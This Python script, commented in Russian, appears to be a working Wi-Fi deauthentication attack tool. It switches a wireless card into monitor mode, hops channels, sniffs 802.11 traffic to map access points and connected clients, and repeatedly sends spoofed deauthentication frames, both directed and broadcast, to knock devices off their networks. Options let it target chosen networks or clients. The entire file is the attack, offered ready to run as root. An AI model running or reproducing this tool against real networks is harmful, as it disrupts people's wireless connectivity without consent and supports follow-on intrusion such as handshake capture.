#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import fcntl
import struct
import socket
import argparse
from signal import SIGINT, signal
from subprocess import Popen, PIPE
from threading import Thread, Lock
import time
import sys
import os
import re  # Добавлен импорт
from scapy.all import *
import logging

# Подавить предупреждения Scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0  # Не выводить лишние сообщения Scapy

# Цвета для консоли
W = '\033[0m'   # белый
R = '\033[31m'  # красный
G = '\033[32m'  # зелёный
O = '\033[33m'  # оранжевый
B = '\033[34m'  # синий
P = '\033[35m'  # пурпурный
C = '\033[36m'  # бирюзовый
GR = '\033[37m' # серый
T = '\033[93m'  # коричневатый

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--skip", nargs='*', default=[], help="Skip deauthing this MAC. Example: -s 00:11:BB:33:44:AA")
    parser.add_argument("-i", "--interface", help="Monitor mode interface. Example: -i mon0")
    parser.add_argument("-c", "--channel", help="Listen on specific channel. Example: -c 6")
    parser.add_argument("-m", "--maximum", help="Max number of clients to deauth. Example: -m 5")
    parser.add_argument("-n", "--noupdate", help="Don't clear list when max reached. Use with -m.", action='store_true')
    parser.add_argument("-t", "--timeinterval", help="Time between packets. Default: as fast as possible. Try: -t 0.00001")
    parser.add_argument("-p", "--packets", help="Number of deauth packets per burst. Default: 1", type=int, default=1)
    parser.add_argument("-d", "--directedonly", help="Skip broadcast deauths, target only client-AP pairs", action='store_true')
    parser.add_argument("-a", "--accesspoint", nargs='*', default=[], help="Target specific AP by SSID or MAC")
    parser.add_argument("--world", help="Use 13 channels (EU/Asia) instead of 11", action="store_true")
    parser.add_argument("--dry-run", dest="dry_run", action='store_true', help="Do not send deauth packets", default=False)
    return parser.parse_args()


# === Работа с интерфейсами ===
def get_mon_iface(args):
    global monitor_on
    monitors, interfaces = iwconfig()
    if args.interface:
        monitor_on = True
        return args.interface
    if monitors:
        monitor_on = True
        return monitors[0]
    print(f'[{G}*{W}] Finding the most powerful interface...')
    os.system('pkill NetworkManager')
    interface = get_iface(interfaces)
    monmode = start_mon_mode(interface)
    return monmode

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=PIPE)
    except OSError:
        sys.exit(f'[{R}-{W}] Could not execute "iwconfig"')
    out, err = proc.communicate()
    for line in out.decode().split('\n'):
        if not line.strip():
            continue
        if line[0] != ' ':
            if re.search(r'eth[0-9]|em[0-9]|p[1-9]p[1-9]', line):
                continue
            iface = line.split()[0]
            if 'Mode:Monitor' in line:
                monitors.append(iface)
            elif 'IEEE 802.11' in line:
                interfaces[iface] = 1 if 'ESSID:"' in line else 0
    return monitors, interfaces

def get_iface(interfaces):
    scanned_aps = []
    if not interfaces:
        sys.exit(f'[{R}-{W}] No wireless interfaces found.')
    if len(interfaces) == 1:
        return next(iter(interfaces))
    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=PIPE)
        out, _ = proc.communicate()
        for line in out.decode().split('\n'):
            if ' - Address:' in line:
                count += 1
        scanned_aps.append((count, iface))
        print(f'[{G}+{W}] Networks discovered by {G}{iface}{W}: {T}{count}{W}')
    try:
        return max(scanned_aps)[1]
    except:
        return next(iter(interfaces))

def start_mon_mode(interface):
    print(f'[{G}+{W}] Starting monitor mode on {G}{interface}{W}')
    try:
        os.system(f'ip link set {interface} down')
        os.system(f'iwconfig {interface} mode monitor')
        os.system(f'ip link set {interface} up')
        return interface
    except Exception:
        sys.exit(f'[{R}-{W}] Could not start monitor mode')

def remove_mon_iface(mon_iface):
    os.system(f'ip link set {mon_iface} down')
    os.system(f'iwconfig {mon_iface} mode managed')
    os.system(f'ip link set {mon_iface} up')

def mon_mac(mon_iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifname = mon_iface.encode('utf-8')
    try:
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
        mac = ':'.join('%02x' % b for b in info[18:24])
        print(f'[{G}*{W}] Monitor mode: {G}{mon_iface}{W} - {O}{mac}{W}')
        return mac
    finally:
        s.close()


# === Основная логика ===
def channel_hop(mon_iface, args):
    global monchannel, first_pass
    channelNum = 0
    maxChan = 13 if args.world else 11
    while True:
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum += 1
            if channelNum > maxChan:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = str(channelNum)
            proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=PIPE, stderr=PIPE)
            _, err = proc.communicate()
            if err.strip():
                print(f'[{R}-{W}] Channel hopping failed: {R}{err.decode().strip()}{W}')
        output(None, monchannel)
        if args.channel:
            time.sleep(0.05)
        else:
            if first_pass == 1:
                time.sleep(1)
                continue
        if not args.dry_run:
            deauth(monchannel)
        time.sleep(0.01)

def deauth(monchannel):
    pkts = []
    if clients_APs:
        with lock:
            for x in clients_APs:
                client, ap, ch = x[0], x[1], x[2]
                if ch == monchannel:
                    pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                    pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                    pkts.extend([pkt1, pkt2])
    if APs and not args.directedonly:
        with lock:
            for a in APs:
                ap, ch = a[0], a[1]
                if ch == monchannel:
                    pkt = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                    pkts.append(pkt)
    if pkts and not args.dry_run:
        interval = float(args.timeinterval) if args.timeinterval else 0.00001
        count = args.packets or 1
        for p in pkts:
            send(p, inter=interval, count=count)

def output(err, monchannel):
    os.system('clear')
    if args.dry_run:
        print(P + "***DRY-RUN***" + W)
    if err:
        print(err)
    print(f'[{G}+{W}] {mon_iface} channel: {G}{monchannel}{W}\n')
    if clients_APs:
        print('                  Deauthing                 ch   ESSID')
        with lock:
            for ca in clients_APs:
                if len(ca) > 3:
                    print(f'[{T}*{W}] {O}{ca[0]}{W} - {O}{ca[1]}{W} - {ca[2].ljust(2)} - {T}{ca[3]}{W}')
                else:
                    print(f'[{T}*{W}] {O}{ca[0]}{W} - {O}{ca[1]}{W} - {ca[2]}')
    if APs:
        print('\n      Access Points     ch   ESSID')
        with lock:
            for ap in APs:
                print(f'[{T}*{W}] {O}{ap[0]}{W} - {ap[1].ljust(2)} - {T}{ap[2]}{W}')
    print()

def noise_filter(skip, addr1, addr2):
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:',
              '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
    if skip:
        ignore += [addr.lower() for addr in skip]
    return any(i in addr1 or i in addr2 for i in ignore)

def cb(pkt):
    global clients_APs, APs
    if args.maximum:
        if args.noupdate:
            if len(clients_APs) >= int(args.maximum):
                return
        elif len(clients_APs) >= int(args.maximum):
            with lock:
                clients_APs = []
                APs = []
    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:
            addr1 = pkt.addr1.lower()
            addr2 = pkt.addr2.lower()
            if args.accesspoint:
                if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt[Dot11Elt].info.decode('utf-8', errors='ignore') in args.accesspoint:
                    args.accesspoint.add(pkt[Dot11].addr3.lower())
                if not any(ap.lower() in [addr1, addr2] for ap in args.accesspoint):
                    return
            if args.skip and addr2 in [s.lower() for s in args.skip]:
                return
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel, args.world)
            if noise_filter(args.skip, addr1, addr2):
                return
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, addr1, addr2)

def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
    try:
        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
        bssid = pkt[Dot11].addr3.lower()
        ap_channel = ord(pkt[Dot11Elt:3].info)
        chans = list(range(1, 14)) if world_arg else list(range(1, 12))
        if ap_channel not in chans:
            return
        if chan_arg and str(ap_channel) != chan_arg:
            return
        with lock:
            if not any(b[0] == bssid for b in APs):
                APs.append([bssid, str(ap_channel), ssid])
    except:
        pass

def clients_APs_add(clients_APs, addr1, addr2):
    with lock:
        if any(addr1 in ca and addr2 in ca for ca in clients_APs):
            return
    if APs:
        AP_check(addr1, addr2)
    else:
        with lock:
            clients_APs.append([addr1, addr2, monchannel])

def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0] in addr1 or ap[0] in addr2:
            with lock:
                clients_APs.append([addr1, addr2, ap[1], ap[2]])
            return

def stop(signal, frame):
    print(f'\n[{R}!{W}] Closing...')
    if monitor_on:
        os.system('service network-manager restart')
    else:
        remove_mon_iface(mon_iface)
        os.system('service network-manager restart')
    sys.exit(0)

# === Главная функция ===
if __name__ == "__main__":
    args = parse_args()
    if os.geteuid() != 0:
        sys.exit(f'[{R}-{W}] Please run as root')
    clients_APs = []
    APs = []
    DN = open(os.devnull, 'wb')  # бинарный режим
    lock = Lock()
    args.skip = [s.lower() for s in args.skip]
    args.accesspoint = set(_.lower() if ':' in _ else _ for _ in args.accesspoint)
    monitor_on = False
    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1
    monchannel = "1"
    hop = Thread(target=channel_hop, args=(mon_iface, args), daemon=True)
    hop.start()
    signal(SIGINT, stop)
    try:
        sniff(iface=mon_iface, store=0, prn=cb)
    except KeyboardInterrupt:
        stop(None, None)
    except Exception as e:
        print(f'\n[{R}!{W}] Error: {e}')
        remove_mon_iface(mon_iface)
        os.system('service network-manager restart')